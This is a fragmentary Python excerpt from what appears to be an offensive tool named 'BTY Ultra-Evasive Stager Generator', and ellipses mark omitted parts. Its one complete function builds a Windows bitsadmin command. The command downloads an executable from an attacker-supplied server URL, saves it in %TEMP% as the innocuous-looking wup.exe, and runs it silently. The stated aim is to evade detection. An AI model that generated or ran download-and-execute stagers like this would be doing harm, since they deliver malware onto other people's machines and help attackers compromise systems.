...
def generate_bitsadmin_stager(server_url):
    ...
    return f'bitsadmin /transfer BTY /download /priority HIGH "{server_url}" %TEMP%\\wup.exe && start /b %TEMP%\\wup.exe'
...
def main():
    p = argparse.ArgumentParser(description="BTY Ultra-Evasive Stagers")
    ...
    print(f"""
  ╔══════════════════════════════════════════════╗
  ║     BTY Ultra-Evasive Stager Generator       ║
  ╚══════════════════════════════════════════════╝
